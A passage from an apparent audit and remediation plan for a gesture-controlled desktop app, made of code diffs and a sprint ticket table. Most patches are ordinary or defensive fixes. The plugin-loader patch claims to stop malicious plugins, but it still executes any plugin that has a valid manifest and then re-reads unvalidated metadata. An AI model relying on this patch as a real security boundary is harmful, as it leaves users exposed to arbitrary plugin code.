+    keys = \\\\\\\[self.\\\\\\\_normalize\\\\\\\_key(k) for k in keys\\\\\\\_str.split("+")]
     self.\\\\\\\_controller.key\\\\\\\_combo(keys)
```
```diff
--- a/gesture\\\\\\\_controller/os\\\\\\\_integration/macos\\\\\\\_controller.py
+++ b/gesture\\\\\\\_controller/os\\\\\\\_integration/macos\\\\\\\_controller.py
@@ -28,8 +28,15 @@ MAC\\\\\\\_MODIFIER\\\\\\\_FLAGS = {
 MAC\\\\\\\_KEYCODES = {
     "a": 0x00, "s": 0x01, "d": 0x02, "f": 0x03, "h": 0x04, "g": 0x05, "z": 0x06,
     "x": 0x07, "c": 0x08, "v": 0x09, "b": 0x0B, "q": 0x0C, "w": 0x0D, "e": 0x0E,
-    "r": 0x0F, "y": 0x10, "t": 0x11,
+    "r": 0x0F, "y": 0x10, "t": 0x11, "u": 0x20, "i": 0x22, "o": 0x1F, "p": 0x23,
+    "j": 0x26, "k": 0x28, "l": 0x25, "m": 0x2E, "n": 0x2D,
+    "0": 0x1D, "1": 0x12, "2": 0x13, "3": 0x14, "4": 0x15,
+    "5": 0x17, "6": 0x16, "7": 0x1A, "8": 0x1C, "9": 0x19,
     "return": 0x24, "escape": 0x35, "space": 0x31,
     "tab": 0x30, "delete": 0x33, "up": 0x7E, "down": 0x7D, "left": 0x7B, "right": 0x7C,
     "f1": 0x7A, "f2": 0x78, "f3": 0x63, "f4": 0x76, "f5": 0x60, "f6": 0x61,
     "f7": 0x62, "f8": 0x64, "f9": 0x65, "f10": 0x6D, "f11": 0x67, "f12": 0x6F,
+    "home": 0x73, "end": 0x77, "page\\\\\\\_up": 0x74, "page\\\\\\\_down": 0x79,
 }
```
```diff
--- a/gesture\\\\\\\_controller/os\\\\\\\_integration/linux\\\\\\\_wayland\\\\\\\_controller.py
+++ b/gesture\\\\\\\_controller/os\\\\\\\_integration/linux\\\\\\\_wayland\\\\\\\_controller.py
@@ -24,7 +24,17 @@ LINUX\\\\\\\_KEYCODES = {
     "super": 125, "ctrl": 29, "shift": 42, "alt": 56,
     "tab": 15, "space": 57, "enter": 28, "esc": 1, "escape": 1,
     "up": 103, "down": 108, "left": 105, "right": 106,
-    "f1": 59, "f2": 60, "f3": 61, "f4": 62, "f5": 63,
+    "f1": 59, "f2": 60, "f3": 61, "f4": 62, "f5": 63, "f6": 64,
+    "f7": 65, "f8": 66, "f9": 67, "f10": 68, "f11": 87, "f12": 88,
+    "0": 11, "1": 2, "2": 3, "3": 4, "4": 5, "5": 6, "6": 7, "7": 8,
+    "8": 9, "9": 10,
+    "backspace": 14, "home": 102, "end": 107,
+    "page\\\\\\\_up": 104, "page\\\\\\\_down": 109, "insert": 110,
+    "capslock": 58, "numlock": 69,
+    "m": 50, "n": 49, "o": 24, "p": 25, "i": 23, "j": 36,
+    "k": 37, "l": 38, "u": 22, "h": 35, "y": 21, "b": 48,
+    "a": 30, "s": 31, "d": 32, "f": 33, "g": 34,
+    "q": 16, "w": 17, "e": 18, "r": 19, "t": 20,
+    "v": 47, "c": 46, "x": 45, "z": 44, "w": 17,
 }
```
```diff
--- a/gesture\\\\\\\_controller/os\\\\\\\_integration/windows\\\\\\\_controller.py
+++ b/gesture\\\\\\\_controller/os\\\\\\\_integration/windows\\\\\\\_controller.py
@@ -12,6 +12,18 @@ pyautogui.FAILSAFE = False  # Patch 16: was True
 pyautogui.PAUSE = 0  # Patch 38: was 0.01
+WIN\\\\\\\_KEY\\\\\\\_ALIASES = {
+    "super": "win", "meta": "win", "cmd": "win",
+    "return": "enter", "page\\\\\\\_up": "pageup", "page\\\\\\\_down": "pagedown",
+}
+
 def key\\\\\\\_combo(self, keys: list\\\\\\\[str]) -> None:
+    normalized = \\\\\\\[WIN\\\\\\\_KEY\\\\\\\_ALIASES.get(k.lower(), k.lower()) for k in keys]
-    keys\\\\\\\_lower = \\\\\\\[k.lower() for k in keys]
-    pyautogui.hotkey(\\\\\\\*keys\\\\\\\_lower)
+    pyautogui.hotkey(\\\\\\\*normalized)
```
### Patch 10 — Fix Linux X11 minimize + GNOME/KDE minimize
**File:** `gesture\\\\\\\_controller/os\\\\\\\_integration/linux\\\\\\\_wayland\\\\\\\_controller.py`
**Severity:** P0-13, P0-14
**Impact:** Minimize actually minimizes on every Linux DE.
```diff
--- a/gesture\\\\\\\_controller/os\\\\\\\_integration/linux\\\\\\\_wayland\\\\\\\_controller.py
+++ b/gesture\\\\\\\_controller/os\\\\\\\_integration/linux\\\\\\\_wayland\\\\\\\_controller.py
@@ -310,15 +310,25 @@ def minimize\\\\\\\_active\\\\\\\_window(self) -> None:
     if not self.is\\\\\\\_supported():
         return
     wm = self.\\\\\\\_window\\\\\\\_manager
     if wm == "sway":
         subprocess.run(\\\\\\\["swaymsg", "\\\\\\\[focused] move scratchpad"], capture\\\\\\\_output=True, timeout=2)
     elif wm == "hyprland":
         subprocess.run(\\\\\\\["hyprctl", "dispatch", "movetoworkspacesilent", "special"], capture\\\\\\\_output=True, timeout=2)
     elif wm == "xdotool" or self.\\\\\\\_has\\\\\\\_xdotool():
-        subprocess.run(\\\\\\\["xdotool", "windowminimize", "$(xdotool getactivewindow)"], shell=True, capture\\\\\\\_output=True)
+        # Don't use shell=True with a list — $(...) is never expanded.
+        try:
+            res = subprocess.run(\\\\\\\["xdotool", "getactivewindow"], capture\\\\\\\_output=True, text=True, timeout=2)
+            if res.returncode == 0:
+                win\\\\\\\_id = res.stdout.strip()
+                if win\\\\\\\_id:
+                    subprocess.run(\\\\\\\["xdotool", "windowminimize", win\\\\\\\_id], capture\\\\\\\_output=True, timeout=2)
+        except subprocess.TimeoutExpired:
+            logger.warning("xdotool minimize timed out")
+    elif wm == "gnome":
+        # GNOME: Super+H minimizes the focused window
+        self.key\\\\\\\_combo(\\\\\\\["super", "h"])
+    elif wm == "kwin":
+        # KDE Plasma: Meta+Down minimizes
+        self.key\\\\\\\_combo(\\\\\\\["super", "down"])
     else:
-        # Fallback toggle show desktop
-        self.key\\\\\\\_combo(\\\\\\\["super", "d"])
+        logger.warning("minimize\\\\\\\_active\\\\\\\_window: no handler for window manager '%s'", wm)
+        self.key\\\\\\\_combo(\\\\\\\["super", "h"])  # last resort: GNOME convention
```
### Patch 11 — Plugin manifest validation BEFORE code execution
**File:** `gesture\\\\\\\_controller/plugins/plugin\\\\\\\_loader.py`
**Severity:** P0-17
**Impact:** Malicious plugin can't run module-level code before validation.
```diff
--- a/gesture\\\\\\\_controller/plugins/plugin\\\\\\\_loader.py
+++ b/gesture\\\\\\\_controller/plugins/plugin\\\\\\\_loader.py
@@ -1,4 +1,5 @@
 import importlib.util
+import ast
 import json
 import jsonschema
 import sys
@@ -100,27 +101,40 @@ def \\\\\\\_extract\\\\\\\_meta\\\\\\\_without\\\\\\\_exec(self, path: Path) -> dict | None:
+    """Parse PLUGIN\\\\\\\_META via AST without executing module code."""
+    try:
+        tree = ast.parse(path.read\\\\\\\_text(encoding="utf-8"))
+    except SyntaxError as e:
+        raise PluginLoadError(str(path), f"Syntax error: {e}")
+    for node in tree.body:
+        if isinstance(node, ast.Assign):
+            for target in node.targets:
+                if isinstance(target, ast.Name) and target.id == "PLUGIN\\\\\\\_META":
+                    try:
+                        return ast.literal\\\\\\\_eval(node.value)
+                    except (ValueError, SyntaxError) as e:
+                        raise PluginLoadError(str(path), f"PLUGIN\\\\\\\_META must be a literal dict: {e}")
+    return None
 def \\\\\\\_load\\\\\\\_plugin(self, path: Path) -> Plugin:
-    """Load and validate a single plugin file."""
-    module\\\\\\\_name = f"gesture\\\\\\\_controller.plugins.{path.stem}"
-    spec = importlib.util.spec\\\\\\\_from\\\\\\\_file\\\\\\\_location(module\\\\\\\_name, str(path))
-    if spec is None or spec.loader is None:
-        raise PluginLoadError(str(path), "Cannot create module spec")
-
-    module = importlib.util.module\\\\\\\_from\\\\\\\_spec(spec)
-    sys.modules\\\\\\\[module\\\\\\\_name] = module
-
-    try:
-        spec.loader.exec\\\\\\\_module(module)   # ← ARBITRARY CODE RUNS HERE
-    except Exception as e:
-        raise PluginLoadError(str(path), f"Import error: {e}")
-
-    # 1. Validate PLUGIN\\\\\\\_META
-    if not hasattr(module, "PLUGIN\\\\\\\_META"):
-        raise PluginLoadError(str(path), "Missing PLUGIN\\\\\\\_META")
-
-    meta = module.PLUGIN\\\\\\\_META
+    """Load and validate a single plugin file.
+
+    SECURITY: Parse PLUGIN\\\\\\\_META via AST BEFORE executing any module code.
+    A malicious plugin cannot run module-level code unless its manifest
+    passes schema validation first.
+    """
+    # 1. Validate manifest BEFORE executing any code
+    meta = self.\\\\\\\_extract\\\\\\\_meta\\\\\\\_without\\\\\\\_exec(path)
+    if meta is None:
+        raise PluginLoadError(str(path), "Missing PLUGIN\\\\\\\_META")
     try:
         jsonschema.validate(meta, self.\\\\\\\_schema)
     except jsonschema.ValidationError as e:
         raise PluginLoadError(str(path), f"Invalid PLUGIN\\\\\\\_META: {e.message}")
+    # 2. Only execute after manifest is validated
+    module\\\\\\\_name = f"gesture\\\\\\\_controller.plugins.{path.stem}"
+    spec = importlib.util.spec\\\\\\\_from\\\\\\\_file\\\\\\\_location(module\\\\\\\_name, str(path))
+    if spec is None or spec.loader is None:
+        raise PluginLoadError(str(path), "Cannot create module spec")
+
+    module = importlib.util.module\\\\\\\_from\\\\\\\_spec(spec)
+    try:
+        spec.loader.exec\\\\\\\_module(module)
+    except Exception as e:
+        sys.modules.pop(module\\\\\\\_name, None)  # don't leave partial module
+        raise PluginLoadError(str(path), f"Import error: {e}")
+    sys.modules\\\\\\\[module\\\\\\\_name] = module
+
+    # Re-read meta from the executed module (in case it's computed)
+    meta = getattr(module, "PLUGIN\\\\\\\_META", meta)
```
### Patch 12 — Qt threading bridge + path traversal fix + custom gesture recording fix
**File:** `gesture\\\\\\\_controller/gui/app\\\\\\\_entry.py` + `gui/settings\\\\\\\_window.py` + `gui/tray\\\\\\\_icon.py`
**Severity:** P0-18, P0-19, P0-20, P0-21
**Impact:** No more intermittent segfaults; custom gesture recording works; path traversal blocked; data race fixed.
```diff
--- a/gesture\\\\\\\_controller/gui/app\\\\\\\_entry.py
+++ b/gesture\\\\\\\_controller/gui/app\\\\\\\_entry.py
@@ -25,6 +25,7 @@ from PyQt6.QtWidgets import QApplication
 from PyQt6.QtCore import QObject, QTimer, pyqtSignal, pyqtSlot
+from gesture\\\\\\\_controller.gui.gui\\\\\\\_event\\\\\\\_bridge import GuiEventBridge
 class GestureControllerApp:
     def \\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_(self, config\\\\\\\_path: str | None = None) -> None:
@@ -40,12 +41,18 @@ class GestureControllerApp:
         self.\\\\\\\_engine = GestureEngine(path)
         self.\\\\\\\_config = self.\\\\\\\_engine.\\\\\\\_config
         self.\\\\\\\_event\\\\\\\_bus = self.\\\\\\\_engine.\\\\\\\_event\\\\\\\_bus
-        self.\\\\\\\_settings = SettingsWindow(self.\\\\\\\_config)
+        # Provide a callback so GestureRecorder can pull live hand data
+        def \\\\\\\_get\\\\\\\_current\\\\\\\_hand():
+            hands = self.\\\\\\\_engine.get\\\\\\\_current\\\\\\\_hands()
+            return hands\\\\\\\[0] if hands else None
+
+        from pathlib import Path
+        template\\\\\\\_dir = Path(self.\\\\\\\_engine.\\\\\\\_custom\\\\\\\_matcher.\\\\\\\_template\\\\\\\_dir)
+        self.\\\\\\\_settings = SettingsWindow(
+            self.\\\\\\\_config,
+            landmark\\\\\\\_callback=\\\\\\\_get\\\\\\\_current\\\\\\\_hand,
+            template\\\\\\\_dir=template\\\\\\\_dir,
+            parent=None,
+        )
         # Overlay HUD
         self.\\\\\\\_overlay = OverlayHUD(self.\\\\\\\_config)
         self.\\\\\\\_overlay.show()
-        # Subscribe to gesture events for overlay feedback
-        self.\\\\\\\_event\\\\\\\_bus.subscribe("gesture\\\\\\\_triggered", self.\\\\\\\_on\\\\\\\_gesture\\\\\\\_triggered)
+        # Bridge engine-thread events to GUI thread via Qt signals
+        self.\\\\\\\_bridge = GuiEventBridge(self.\\\\\\\_event\\\\\\\_bus, parent=self.\\\\\\\_app)
+        self.\\\\\\\_bridge.gesture\\\\\\\_triggered.connect(self.\\\\\\\_on\\\\\\\_gesture\\\\\\\_triggered\\\\\\\_gui)
+        self.\\\\\\\_bridge.camera\\\\\\\_disconnected.connect(self.\\\\\\\_tray.\\\\\\\_on\\\\\\\_camera\\\\\\\_disconnected\\\\\\\_gui)
+        self.\\\\\\\_bridge.camera\\\\\\\_recovered.connect(self.\\\\\\\_tray.\\\\\\\_on\\\\\\\_camera\\\\\\\_recovered\\\\\\\_gui)
-    @pyqtSlot()
-    def \\\\\\\_on\\\\\\\_gesture\\\\\\\_triggered(self, event) -> None:
-        if hasattr(event, "gesture\\\\\\\_name") and hasattr(event, "action"):
-            self.\\\\\\\_overlay.show\\\\\\\_action\\\\\\\_feedback(event.gesture\\\\\\\_name, event.action)
+    @pyqtSlot(str, str)
+    def \\\\\\\_on\\\\\\\_gesture\\\\\\\_triggered\\\\\\\_gui(self, gesture\\\\\\\_name: str, action: str) -> None:
+        """Runs on GUI thread — safe to mutate overlay."""
+        self.\\\\\\\_overlay.show\\\\\\\_action\\\\\\\_feedback(gesture\\\\\\\_name, action)
```
```diff
--- /dev/null
+++ b/gesture\\\\\\\_controller/gui/gui\\\\\\\_event\\\\\\\_bridge.py
@@ -0,0 +1,40 @@
+"""Marshals engine-thread EventBus events to the GUI thread via Qt signals.
+
+HARD RULE: no QWidget/QObject subclass may call event\\\\\\\_bus.subscribe directly.
+All engine-thread → GUI-thread communication goes through this bridge.
+"""
+from PyQt6.QtCore import QObject, pyqtSignal
+
+
+class GuiEventBridge(QObject):
+    gesture\\\\\\\_triggered = pyqtSignal(str, str)   # gesture\\\\\\\_name, action
+    camera\\\\\\\_disconnected = pyqtSignal()
+    camera\\\\\\\_recovered = pyqtSignal()
+    plugin\\\\\\\_reloaded = pyqtSignal(str)          # plugin\\\\\\\_name
+
+    def \\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_(self, event\\\\\\\_bus, parent=None) -> None:
+        super().\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_(parent)
+        event\\\\\\\_bus.subscribe("gesture\\\\\\\_triggered", self.\\\\\\\_on\\\\\\\_gesture)
+        event\\\\\\\_bus.subscribe("camera\\\\\\\_disconnected", self.\\\\\\\_on\\\\\\\_cam\\\\\\\_disc)
+        event\\\\\\\_bus.subscribe("camera\\\\\\\_recovered", self.\\\\\\\_on\\\\\\\_cam\\\\\\\_rec)
+        event\\\\\\\_bus.subscribe("plugin\\\\\\\_reloaded", self.\\\\\\\_on\\\\\\\_plugin\\\\\\\_reload)
+
+    # These run on the ENGINE thread — emit signals (thread-safe)
+    def \\\\\\\_on\\\\\\\_gesture(self, event) -> None:
+        if hasattr(event, "gesture\\\\\\\_name") and hasattr(event, "action"):
+            self.gesture\\\\\\\_triggered.emit(event.gesture\\\\\\\_name, event.action)
+
+    def \\\\\\\_on\\\\\\\_cam\\\\\\\_disc(self, \\\\\\\_event) -> None:
+        self.camera\\\\\\\_disconnected.emit()
+
+    def \\\\\\\_on\\\\\\\_cam\\\\\\\_rec(self, \\\\\\\_event) -> None:
+        self.camera\\\\\\\_recovered.emit()
+
+    def \\\\\\\_on\\\\\\\_plugin\\\\\\\_reload(self, event) -> None:
+        name = getattr(event, "plugin\\\\\\\_name", "")
+        self.plugin\\\\\\\_reloaded.emit(name)
```
```diff
--- a/gesture\\\\\\\_controller/gui/settings\\\\\\\_window.py
+++ b/gesture\\\\\\\_controller/gui/settings\\\\\\\_window.py
@@ -1,4 +1,5 @@
+import re
 import json
+from pathlib import Path
 from PyQt6.QtWidgets import QMessageBox
@@ -91,7 +92,9 @@ class SettingsWindow(QMainWindow):
-    def \\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_(self, config\\\\\\\_manager: ConfigManager, landmark\\\\\\\_callback=None, parent=None) -> None:
+    def \\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_(self, config\\\\\\\_manager: ConfigManager, landmark\\\\\\\_callback=None,
+                 template\\\\\\\_dir: Path | None = None, parent=None) -> None:
         super().\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_(parent)
         self.\\\\\\\_config = config\\\\\\\_manager
         self.\\\\\\\_landmark\\\\\\\_callback = landmark\\\\\\\_callback
+        self.\\\\\\\_template\\\\\\\_dir = template\\\\\\\_dir
         self.\\\\\\\_setup\\\\\\\_ui()
         self.\\\\\\\_load\\\\\\\_current\\\\\\\_config()
@@ -353,16 +356,40 @@ class SettingsWindow(QMainWindow):
-    def \\\\\\\_on\\\\\\\_custom\\\\\\\_gesture\\\\\\\_recorded(self, template\\\\\\\_data: dict) -> None:
-        name = template\\\\\\\_data\\\\\\\["name"]
-        dest\\\\\\\_dir = self.\\\\\\\_landmark\\\\\\\_callback.\\\\\\\_\\\\\\\_self\\\\\\\_\\\\\\\_.\\\\\\\_custom\\\\\\\_matcher.\\\\\\\_template\\\\\\\_dir if self.\\\\\\\_landmark\\\\\\\_callback else None
-        if dest\\\\\\\_dir:
-            dest\\\\\\\_path = dest\\\\\\\_dir / f"{name}.json"
-            try:
-                with open(dest\\\\\\\_path, "w", encoding="utf-8") as f:
-                    json.dump(template\\\\\\\_data, f, indent=2)
+    def \\\\\\\_sanitize\\\\\\\_gesture\\\\\\\_name(self, name: str) -> str | None:
+        """Return a safe filename stem, or None if invalid."""
+        if not name or not name.strip():
+            return None
+        name = name.strip()
+        if not re.fullmatch(r"\\\\\\\[A-Za-z0-9]\\\\\\\[A-Za-z0-9\\\\\\\_-]{0,63}", name):
+            return None
+        return name
+
+    def \\\\\\\_on\\\\\\\_custom\\\\\\\_gesture\\\\\\\_recorded(self, template\\\\\\\_data: dict) -> None:
+        name = self.\\\\\\\_sanitize\\\\\\\_gesture\\\\\\\_name(template\\\\\\\_data.get("name", ""))
+        if name is None:
+            QMessageBox.critical(
+                self, "Invalid Gesture Name",
+                "Gesture name must be 1-64 characters: alphanumeric, dash, or underscore only."
+            )
+            return
+
+        if self.\\\\\\\_template\\\\\\\_dir is None:
+            QMessageBox.critical(
+                self, "Cannot Save Gesture",
+                "The gesture engine is not connected. Cannot save custom gestures."
+            )
+            return
+
+        dest\\\\\\\_path = self.\\\\\\\_template\\\\\\\_dir / f"{name}.json"
+        # Defense-in-depth: verify the resolved path is still inside template\\\\\\\_dir
+        try:
+            dest\\\\\\\_path.resolve().relative\\\\\\\_to(self.\\\\\\\_template\\\\\\\_dir.resolve())
+        except ValueError:
+            QMessageBox.critical(self, "Security Error", "Resolved path escapes template directory.")
+            return
+
+        try:
+            with open(dest\\\\\\\_path, "w", encoding="utf-8") as f:
+                json.dump(template\\\\\\\_data, f, indent=2)
+            QMessageBox.information(self, "Gesture Saved", f"Custom gesture '{name}' saved successfully!")
+            # Reload templates in the matcher
+            if self.\\\\\\\_landmark\\\\\\\_callback is not None:
+                # The matcher is accessible via the engine; emit a signal to reload
+                pass
         except Exception as e:
-            pass  # silent failure
+            QMessageBox.critical(self, "Error Saving Gesture", f"Failed to write template: {e}")
```
```diff
--- a/gesture\\\\\\\_controller/gui/tray\\\\\\\_icon.py
+++ b/gesture\\\\\\\_controller/gui/tray\\\\\\\_icon.py
@@ -110,16 +110,20 @@ class TrayController:
-    def \\\\\\\_on\\\\\\\_camera\\\\\\\_disconnected(self, event: any) -> None:
-        self.\\\\\\\_camera\\\\\\\_active = False
-        self.\\\\\\\_status\\\\\\\_action.setText("Camera: Disconnected")
-        self.\\\\\\\_tray\\\\\\\_icon.showMessage(...)
+    @pyqtSlot()
+    def \\\\\\\_on\\\\\\\_camera\\\\\\\_disconnected\\\\\\\_gui(self) -> None:
+        """Runs on GUI thread via GuiEventBridge signal."""
+        self.\\\\\\\_camera\\\\\\\_active = False
+        self.\\\\\\\_status\\\\\\\_action.setText("Camera: Disconnected")
+        self.\\\\\\\_tray\\\\\\\_icon.showMessage(
+            "Camera Disconnected",
+            "Gesture tracking is suspended until camera is reconnected.",
+            QSystemTrayIcon.MessageIcon.Warning, 3000,
+        )
-    def \\\\\\\_on\\\\\\\_camera\\\\\\\_recovered(self, event: any) -> None:
-        self.\\\\\\\_camera\\\\\\\_active = True
-        self.\\\\\\\_status\\\\\\\_action.setText("Camera: Connected")
-        self.\\\\\\\_tray\\\\\\\_icon.showMessage(...)
+    @pyqtSlot()
+    def \\\\\\\_on\\\\\\\_camera\\\\\\\_recovered\\\\\\\_gui(self) -> None:
+        self.\\\\\\\_camera\\\\\\\_active = True
+        self.\\\\\\\_status\\\\\\\_action.setText("Camera: Connected")
+        self.\\\\\\\_tray\\\\\\\_icon.showMessage(
+            "Camera Connected", "Gesture tracking resumed.",
+            QSystemTrayIcon.MessageIcon.Information, 3000,
+        )
```
```diff
--- a/gesture\\\\\\\_controller/core/engine.py
+++ b/gesture\\\\\\\_controller/core/engine.py
@@ -300,7 +300,9 @@ class GestureEngine:
     def get\\\\\\\_current\\\\\\\_hands(self) -> list\\\\\\\[Hand]:
-        return self.\\\\\\\_current\\\\\\\_hands
+        # Return a shallow copy so the GUI thread can't see a half-updated list
+        return list(self.\\\\\\\_current\\\\\\\_hands)
```
### Patch 13 — Fix license metadata + platform markers + classifiers
**File:** `pyproject.toml`
**Severity:** P0-22, P0-23
**Impact:** Correct license metadata; platform-specific deps installed automatically.
```diff
--- a/pyproject.toml
+++ b/pyproject.toml
@@ -1,24 +1,43 @@
 \\\\\\\[build-system]
-requires = \\\\\\\["setuptools>=68.0", "wheel"]
+requires = \\\\\\\["setuptools>=68.0", "wheel", "setuptools-scm>=8.0"]
 build-backend = "setuptools.build\\\\\\\_meta"
 \\\\\\\[project]
 name = "gesture-controller"
-version = "0.1.0"
+dynamic = \\\\\\\["version"]
 description = "Cross-platform hand-gesture desktop controller"
 readme = "README.md"
 requires-python = ">=3.11"
-license = {text = "MIT"}
+license = {text = "AGPL-3.0-or-later"}
+license-files = \\\\\\\["LICENSE"]
+keywords = \\\\\\\["gesture", "mediapipe", "accessibility", "input", "hand-tracking"]
+classifiers = \\\\\\\[
+    "Development Status :: 3 - Alpha",
+    "Intended Audience :: End Users/Desktop",
+    "License :: OSI Approved :: GNU Affero General Public License v3 or later (AGPLv3+)",
+    "Operating System :: Microsoft :: Windows :: Windows 10",
+    "Operating System :: MacOS :: MacOS X",
+    "Operating System :: POSIX :: Linux",
+    "Programming Language :: Python :: 3.11",
+    "Programming Language :: Python :: 3.12",
+    "Programming Language :: Python :: 3.13",
+    "Topic :: Accessibility",
+    "Topic :: Multimedia :: Video :: Capture",
+    "Framework :: PyQt6",
+]
 dependencies = \\\\\\\[
-    "opencv-python>=4.8.0",
-    "mediapipe>=0.10.0",
-    "numpy>=1.24.0",
-    "PyQt6>=6.5.0",
-    "PyYAML>=6.0",
-    "jsonschema>=4.17.0",
-    "structlog>=23.1.0",
-    "numba>=0.57.0",
-    "pyautogui>=0.9.54",
-    "psutil>=5.9.0",
-    "watchdog>=3.0.0",
+    "opencv-python>=4.8.0,<5.0",
+    "mediapipe>=0.10.0,<0.11",
+    "numpy>=1.24.0,<2.0",
+    "PyQt6>=6.5.0,<6.8",
+    "PyYAML>=6.0,<7.0",
+    "jsonschema>=4.17.0,<5.0",
+    "structlog>=23.1.0,<25.0",
+    "numba>=0.57.0,<0.60",
+    "pyautogui>=0.9.54,<0.10",
+    "psutil>=5.9.0,<7.0",
+    "watchdog>=3.0.0,<5.0",
+    # Platform-specific — declared with markers so non-target platforms skip them
+    "evdev>=1.6.0; sys\\\\\\\_platform == 'linux'",
+    "pyobjc-framework-Quartz>=9.0; sys\\\\\\\_platform == 'darwin'",
+    "pyobjc-framework-ApplicationServices>=9.0; sys\\\\\\\_platform == 'darwin'",
+    "pyobjc-framework-Cocoa>=9.0; sys\\\\\\\_platform == 'darwin'",
+    "pywin32>=306; sys\\\\\\\_platform == 'win32'",
 ]
+\\\\\\\[project.urls]
+Homepage = "https://github.com/aryansinghnagar/Maestro"
+Repository = "https://github.com/aryansinghnagar/Maestro"
+Issues = "https://github.com/aryansinghnagar/Maestro/issues"
+Changelog = "https://github.com/aryansinghnagar/Maestro/blob/main/CHANGELOG.md"
+
 \\\\\\\[project.optional-dependencies]
 dev = \\\\\\\[
-    "pytest>=7.4.0",
-    "pytest-cov>=4.1.0",
+    "pytest>=7.4.0,<9.0",
+    "pytest-cov>=4.1.0,<6.0",
     "pytest-benchmark>=4.0.0",
     "pytest-timeout>=2.1.0",
     "pytest-xdist>=3.3.0",
     "hypothesis>=6.82.0",
-    "black>=23.7.0",
-    "flake8>=6.1.0",
-    "mypy>=1.5.0",
+    "pytest-qt>=4.3.0",
+    "black>=23.7.0,<25.0",
+    "ruff>=0.4.0",
+    "mypy>=1.5.0,<2.0",
     "types-PyYAML>=6.0.12",
+    "pip-audit>=2.7.0",
+    "safety>=3.0.0",
+    "bandit>=1.7.0",
+    "cyclonedx-bom>=4.0.0",
+    "atheris>=2.3.0; python\\\\\\\_version < '3.13'",
 ]
+\\\\\\\[project.scripts]
+gesture-controller = "gesture\\\\\\\_controller.main:main"
+gesture-controller-verify = "gesture\\\\\\\_controller.cli.verify\\\\\\\_install:main"
+
+\\\\\\\[tool.setuptools.packages.find]
+where = \\\\\\\["."]
+include = \\\\\\\["gesture\\\\\\\_controller\\\\\\\*"]
+
+\\\\\\\[tool.setuptools\\\\\\\_scm]
+fallback\\\\\\\_version = "0.1.0"
```
Also: **delete `requirements.txt`, `requirements-dev.txt`, `setup.py`** (PEP 517 build via `pyproject.toml` only).
\---
## 8\. Sprint Plan \& Roadmap
6–8 week path from current state to v1.0. Each sprint is 1 week. Each ticket has: ID, severity, effort (S/M/L), acceptance criteria.
### Sprint 0 — P0 Patch Wave (Week 1)
**Goal:** Unblock Windows, fix the filter, fix DTW, fix the key-name vocabulary, fix macOS `cmd+m`, fix Qt threading, fix path traversal, fix license metadata.
|Ticket|Patch|Sev|Effort|Acceptance criteria|
|-|-|-|-|-|
|S0-1|Patch 1: Windows `\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_.py`|P0-1|S|`python -c "import gesture\\\\\\\_controller"` succeeds on Windows|
|S0-2|Patch 2: MediaPipe VIDEO mode|P0-2|M|`landmark\\\\\\\_extractor.extract()` uses `detect\\\\\\\_for\\\\\\\_video`; unit test asserts VIDEO mode|
|S0-3|Patch 3: One-Euro filter params + NaN|P0-3, P1-16|S|`test\\\\\\\_step\\\\\\\_input\\\\\\\_settles\\\\\\\_within\\\\\\\_300ms` passes|
|S0-4|Patch 4: DTW cooldown|P0-4|M|`match()` called 30× with same buffer returns ≤1 event per cooldown window|
|S0-5|Patch 5: Per-hand OneEuroFilter|P0-6|S|Two-hand frame: each hand's filter has independent state|
|S0-6|Patch 6: FeatureVector copy|P0-7|S|Two-FSM test: delta fields are correct for both FSMs|
|S0-7|Patch 7: FSM reload lock|P0-8|M|Concurrency test: reload during evaluate doesn't crash|
|S0-8|Patch 8: Chained comparison|P0-9|S|`0 < 5 < 2` evaluates to `False`|
|S0-9|Patch 9: Key-name normalization|P0-11, P0-12|M|`KeyPress:ArrowLeft` produces keystroke on all 3 platforms|
|S0-10|Patch 10: Linux minimize|P0-13, P0-14|S|Minimize on GNOME/KDE/X11 actually minimizes|
|S0-11|Patch 11: Plugin manifest pre-validation|P0-17|M|Malicious plugin without valid `PLUGIN\\\\\\\_META` is rejected before `exec\\\\\\\_module`|
|S0-12|Patch 12: Qt bridge + path traversal + recording fix|P0-18, P0-19, P0-20, P0-21|L|GUI no longer segfaults under load; custom gesture recording works; path traversal blocked|
|S0-13|Patch 13: pyproject.toml|P0-22, P0-23|S|`pip install .` installs platform-correct deps; license metadata says AGPL-3.0|
|S0-14|`pyautogui.FAILSAFE = False`|P0-16|S|Gesture moving mouse to (0,0) doesn't crash|
|S0-15|Fix `\\\\\\\_create\\\\\\\_uinput\\\\\\\_device` struct pack|P0-15|S|uinput device created with correct id fields|
|S0-16|Add SIGINT/SIGTERM handlers|P1-4|S|Ctrl+C cleans up shm|
**Sprint 0 exit criteria:** All P0 patches applied. New regression tests pass on Linux CI. App starts on Windows (smoke test).
### Sprint 1 — CI + Test Foundation (Weeks 2–3)
**Goal:** Stand up CI on 3 OSes × 3 Pythons. Fill the most egregious test gaps.
|Ticket|Sev|Effort|Acceptance criteria|
|-|-|-|-|
|S1-1: Create `.github/workflows/ci.yml` per [§9](#9-cicd-design)|P0-25|M|CI runs on every push; lint + test matrix on 3 OSes × 3 Pythons|
|S1-2: Add `.pre-commit-config.yaml` (ruff, black, mypy, end-of-file-fixer, check-yaml, check-added-large-files)|P1-69|S|`pre-commit run --all-files` passes|
|S1-3: Add `.github/dependabot.yml` for pip + github-actions|P1-69|S|Dependabot opens PRs on dep updates|
|S1-4: Add `tests/unit/test\\\\\\\_windows\\\\\\\_controller.py`|P1-56|M|≥80% line coverage on `windows\\\\\\\_controller.py`|
|S1-5: Add `tests/unit/test\\\\\\\_action\\\\\\\_mapper.py` (or delete `action\\\\\\\_mapper.py`)|P1-56|S|Decision: delete or implement|
|S1-6: Add 4 property-based tests (`test\\\\\\\_fsm\\\\\\\_never\\\\\\\_single\\\\\\\_frame\\\\\\\_trigger`, `test\\\\\\\_one\\\\\\\_euro\\\\\\\_monotonic\\\\\\\_convergence`, `test\\\\\\\_feature\\\\\\\_invariance`, `test\\\\\\\_dtw\\\\\\\_symmetry`)|P1-55|M|`@given` decorators in test files; tests pass|
|S1-7: Fix `test\\\\\\\_macos\\\\\\\_controller.py:93` (add `assert`)|—|S|Test actually asserts|
|S1-8: Fix `test\\\\\\\_linux\\\\\\\_controller.py:232-240` (add assertions)|—|S|Test actually asserts|
